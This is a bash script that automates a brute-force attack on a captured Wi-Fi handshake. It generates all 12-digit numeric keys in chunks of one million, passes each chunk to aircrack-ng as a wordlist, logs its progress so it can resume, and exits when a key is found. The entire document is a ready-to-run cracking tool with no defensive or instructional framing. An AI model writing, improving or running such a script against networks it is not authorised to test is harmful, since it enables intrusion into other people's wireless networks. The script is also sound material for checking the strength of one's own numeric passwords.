#!/bin/bash

# Define the range of 12-digit numbers
start=000000000000
end=999999999999

# Define the number of lines per output file (1 million lines)
lines_per_file=1000000

# Calculate the total number of files needed
total_files=$(( (end - start + 1) / lines_per_file ))

# Prompt the user to specify the path to the target file
read -p "Enter the path to the target file for aircrack-ng: " target_file

# Initialize the variable to store the user's choice for the target network
target_network_choice=2  # Default choice, you can change this to the user's initial choice

# Validate that aircrack-ng is installed
if ! command -v aircrack-ng &>/dev/null; then
  echo "aircrack-ng is not installed. Please install it and try again."
  exit 1
fi

# Initialize file number from log file or start at 1 if log file doesn't exist
log_file="script_log.txt"
if [ -f "$log_file" ]; then
  file_number=$(cat "$log_file")
  echo "Resuming from file $file_number."
else
  file_number=1  # Start with file 1
fi

# Function to cleanup aircrack-ng when script exits
cleanup_aircrack() {
  echo "Quitting aircrack-ng..."
  pkill -f "aircrack-ng -w"
  exit 1
}

# Set up trap to catch script termination and cleanup aircrack-ng
trap 'cleanup_aircrack' INT

while true; do
  # Calculate the starting and ending points for the selected output file
  start_range=$((start + (file_number - 1) * lines_per_file + 1))
  end_range=$((start_range + lines_per_file - 1))

  # Generate the numbers and write them to a temporary file
  temp_file=$(mktemp)
  for ((i = start_range; i <= end_range; i++)); do
    printf "%012d\n" "$i"
  done > "$temp_file"

  echo "Temporary file $temp_file created with $lines_per_file lines."

  # Use aircrack-ng to search for a match in the target file
  echo "Searching for a match in $target_file using aircrack-ng..."

  # Run aircrack-ng, providing the target network choice automatically
  (echo "$target_network_choice") | aircrack-ng -w "$temp_file" "$target_file" | tee aircrack_output.log

  # Check if aircrack found the key
  if grep -q "KEY FOUND" aircrack_output.log; then
    echo "Key found! Stopping the script."
    rm aircrack_output.log  # Remove the aircrack output log
    exit 0  # Exit script successfully
  else
    # Remove the temporary file
    rm "$temp_file"
    echo "Removed temporary file $temp_file to save storage."

    # Check if the range has exceeded the end
    if [ "$start_range" -gt "$end" ]; then
      echo "Exhausted all possible keys. Exiting the script."
      rm aircrack_output.log  # Remove the aircrack output log
      exit 0  # Exit script successfully
    else
      file_number=$((file_number + 1))  # Increment the file number

      # Update the log file with the current file number
      echo "$file_number" > "$log_file"
    fi
  fi
done
